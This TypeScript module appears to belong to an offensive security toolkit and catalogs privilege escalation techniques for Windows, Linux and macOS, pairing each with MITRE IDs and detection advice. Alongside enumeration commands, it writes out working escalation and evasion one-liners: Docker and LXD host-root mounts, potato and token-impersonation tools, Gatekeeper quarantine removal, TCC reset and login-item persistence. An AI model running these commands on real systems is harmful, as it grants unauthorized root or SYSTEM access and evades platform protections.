/**
 * Privilege escalation catalog (port of `modules.privesc`).
 *
 * Real privesc primitives across platforms: token manipulation, service
 * abuse, potato attacks, sudo/SUID/capability abuse, kernel exploits, cron
 * abuse, container escapes, UAC bypass, Gatekeeper/TCC bypass. Each carries
 * prerequisites, success indicators, and detection guidance. Commands are
 * advisory text — nothing executes here.
 */

import { LivePrivescChecker, type PrivescVector } from "./live_privesc.ts"

export interface PrivescTechnique {
  name: string;
  platform: string;
  technique: string;
  mitreId: string;
  command: string;
  prerequisites: string[];
  successIndicators: string[];
  detection: string;
  severity: string;
}

export class PrivilegeEscalator {
  currentOs: string;
  private liveChecker: LivePrivescChecker;

  constructor() {
    this.currentOs = process.platform;
    this.liveChecker = new LivePrivescChecker();
  }

  async runLivePrivescChecks(): Promise<{ vectors: PrivescVector[]; summary: string }> {
    return this.liveChecker.runAllChecks();
  }

  getWindowsPrivesc(): PrivescTechnique[] {
    return [
      {
        name: "PrintSpoofer", platform: "windows", technique: "Print Spooler abuse", mitreId: "T1134.002",
        command: 'PrintSpoofer.exe -c "cmd /c whoami"',
        prerequisites: ["Print Spooler service running", "Impersonation privilege"],
        successIndicators: ["nt authority\\system"],
        detection: "Monitor Print Spooler abuse. Event ID 5138.", severity: "high",
      },
      {
        name: "GodPotato", platform: "windows", technique: "Potato privilege escalation", mitreId: "T1134.002",
        command: 'GodPotato.exe -cmd "cmd /c whoami"',
        prerequisites: ["SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"],
        successIndicators: ["nt authority\\system"],
        detection: "Monitor named pipe connections for potato attacks.", severity: "high",
      },
      {
        name: "SharpUp", platform: "windows", technique: "Automated privesc checks", mitreId: "T1068",
        command: "SharpUp.exe audit",
        prerequisites: ["Any low-priv session"],
        successIndicators: ["Vulnerable!", "Modifiable service", "Unquoted service path"],
        detection: "Monitor SharpUp.exe execution.", severity: "medium",
      },
      {
        name: "Token Manipulation", platform: "windows", technique: "Token impersonation/theft", mitreId: "T1134",
        command: 'incognito.exe impersonate_token "NT AUTHORITY\\SYSTEM"',
        prerequisites: ["SeImpersonatePrivilege or SeDebugPrivilege"],
        successIndicators: ["Impersonated NT AUTHORITY\\SYSTEM"],
        detection: "Monitor token impersonation events. Event ID 4672.", severity: "high",
      },
      {
        name: "Unquoted Service Path", platform: "windows", technique: "Service path exploitation", mitreId: "T1574.009",
        command: 'sc qc "Vulnerable Service" & wmic service get name,pathname | findstr /i "program files"',
        prerequisites: ["Unquoted service path with spaces"],
        successIndicators: ["Path contains spaces without quotes"],
        detection: "Monitor new service binary placement.", severity: "high",
      },
      {
        name: "AlwaysInstallElevated", platform: "windows", technique: "MSI installation abuse", mitreId: "T1548.002",
        command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        prerequisites: ["AlwaysInstallElevated = 1 in both HKLM and HKCU"],
        successIndicators: ["0x1 for both keys"],
        detection: "Monitor MSI installation events. Event ID 11707.", severity: "high",
      },
      {
        name: "DLL Hijacking", platform: "windows", technique: "DLL search order abuse", mitreId: "T1574.001",
        command: 'where /R C:\\Windows\\System32 *.dll 2>nul | findstr /i "app" & accesschk.exe /w /u "Authenticated Users" C:\\Windows\\System32\\*.dll',
        prerequisites: ["Writable DLL in search path or known DLL hijack"],
        successIndicators: ["Write access to DLL location"],
        detection: "Monitor DLL loads in privileged processes. Sysmon Event ID 7.", severity: "high",
      },
      {
        name: "Registry Service DLL", platform: "windows", technique: "Service registry modification", mitreId: "T1574.002",
        command: "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services /s /f ServiceDll 2>nul",
        prerequisites: ["Write access to service registry key"],
        successIndicators: ["Modifiable ServiceDll path"],
        detection: "Monitor service registry key modifications.", severity: "high",
      },
      {
        name: "SeDebugPrivilege", platform: "windows", technique: "Debug privilege abuse", mitreId: "T1134",
        command: "whoami /priv | findstr Debug",
        prerequisites: ["SeDebugPrivilege enabled"],
        successIndicators: ["SeDebugPrivilege enabled"],
        detection: "Monitor debug privilege usage. Event ID 4672.", severity: "high",
      },
    ];
  }

  getLinuxPrivesc(): PrivescTechnique[] {
    return [
      {
        name: "Sudo Misconfiguration", platform: "linux", technique: "Sudo binary abuse", mitreId: "T1548.003",
        command: "sudo -l & GTFOBins",
        prerequisites: ["Sudo with NOPASSWD or specific binary access"],
        successIndicators: ["NOPASSWD:", "(ALL)", "(root)"],
        detection: "Monitor sudo usage. /var/log/auth.log", severity: "high",
      },
      {
        name: "SUID Binary", platform: "linux", technique: "SUID binary abuse", mitreId: "T1548.001",
        command: "find / -perm -4000 -type f 2>/dev/null",
        prerequisites: ["SUID root binary with abuse potential"],
        successIndicators: ["/usr/bin/passwd", "/usr/bin/sudo", "/usr/bin/pkexec"],
        detection: "Monitor SUID binary execution. auditd rules.", severity: "high",
      },
      {
        name: "Capability Abuse", platform: "linux", technique: "Linux capabilities abuse", mitreId: "T1548.001",
        command: "getcap -r / 2>/dev/null",
        prerequisites: ["Binary with dangerous capabilities (cap_setuid, cap_dac_override)"],
        successIndicators: ["cap_setuid", "cap_dac_override", "cap_net_raw"],
        detection: "Monitor capability assignments.", severity: "high",
      },
      {
        name: "Kernel Exploit", platform: "linux", technique: "Kernel vulnerability exploitation", mitreId: "T1068",
        command: "uname -a & searchsploit linux kernel",
        prerequisites: ["Outdated kernel with known CVE"],
        successIndicators: ["kernel version matches known exploits"],
        detection: "Monitor kernel exploit compilation/execution.", severity: "critical",
      },
      {
        name: "Cron Job Abuse", platform: "linux", technique: "Cron writable script injection", mitreId: "T1053.003",
        command: "cat /etc/crontab & ls -la /etc/cron*",
        prerequisites: ["Writable script executed by root cron"],
        successIndicators: ["writable script in cron path"],
        detection: "Monitor cron file modifications.", severity: "high",
      },
      {
        name: "Docker Group", platform: "linux", technique: "Docker socket abuse", mitreId: "T1611",
        command: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        prerequisites: ["User in docker group or Docker socket access"],
        successIndicators: ["Docker group membership", "/var/run/docker.sock accessible"],
        detection: "Monitor Docker container creation with host mounts.", severity: "critical",
      },
      {
        name: "Polkit Abuse", platform: "linux", technique: "PolicyKit vulnerability", mitreId: "T1068",
        command: "pkexec --help & CVE-2021-4034",
        prerequisites: ["Vulnerable polkit version"],
        successIndicators: ["pkexec with CVE-2021-4034"],
        detection: "Monitor pkexec execution and polkit agent activity.", severity: "critical",
      },
      {
        name: "LXD Group", platform: "linux", technique: "LXD container escape", mitreId: "T1611",
        command: "lxc init ubuntu:20.04 privesc -c security.privileged=true && lxc config device add privesc host-root disk source=/ path=/mnt/root",
        prerequisites: ["User in lxd group"],
        successIndicators: ["LXD group membership"],
        detection: "Monitor LXD container creation with host mounts.", severity: "critical",
      },
    ];
  }

  getMacosPrivesc(): PrivescTechnique[] {
    return [
      {
        name: "Sudo Version Exploit", platform: "macos", technique: "Sudo privilege escalation", mitreId: "T1548.003",
        command: "sudo --version",
        prerequisites: ["Sudo version < 1.9.12p1 (CVE-2021-3156)"],
        successIndicators: ["Vulnerable sudo version"],
        detection: "Monitor sudo usage and version.", severity: "high",
      },
      {
        name: "Gatekeeper Bypass", platform: "macos", technique: "Gatekeeper bypass", mitreId: "T1553.001",
        command: "spctl --status & xattr -d com.apple.quarantine payload.app",
        prerequisites: ["Gatekeeper enabled but bypassable"],
        successIndicators: ["Gatekeeper bypassed"],
        detection: "Monitor Gatekeeper status changes.", severity: "high",
      },
      {
        name: "TCC Bypass", platform: "macos", technique: "Transparency Consent Control bypass", mitreId: "T1548.003",
        command: "tccutil reset All",
        prerequisites: ["Existing TCC database access or SIP disabled"],
        successIndicators: ["TCC database modified"],
        detection: "Monitor TCC database access.", severity: "high",
      },
      {
        name: "Login Item Abuse", platform: "macos", technique: "Persistence via login items", mitreId: "T1543.001",
        command: "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/tmp/update\", hidden:false}'",
        prerequisites: ["User session"],
        successIndicators: ["Login item added"],
        detection: "Monitor System Events login item creation.", severity: "medium",
      },
    ];
  }

  getAll(targetOs = ""): Array<Record<string, unknown>> {
    const os = targetOs || (this.currentOs === "win32" ? "windows" : this.currentOs === "darwin" ? "macos" : "linux");
    let techs: PrivescTechnique[];
    if (os === "windows") techs = this.getWindowsPrivesc();
    else if (os === "macos") techs = this.getMacosPrivesc();
    else if (os === "linux") techs = this.getLinuxPrivesc();
    else techs = [...this.getWindowsPrivesc(), ...this.getLinuxPrivesc(), ...this.getMacosPrivesc()];
    return techs.map((t) => ({
      name: t.name,
      platform: t.platform,
      technique: t.technique,
      mitre_id: t.mitreId,
      command: t.command,
      prerequisites: t.prerequisites,
      success_indicators: t.successIndicators,
      detection: t.detection,
      severity: t.severity,
    }));
  }
}
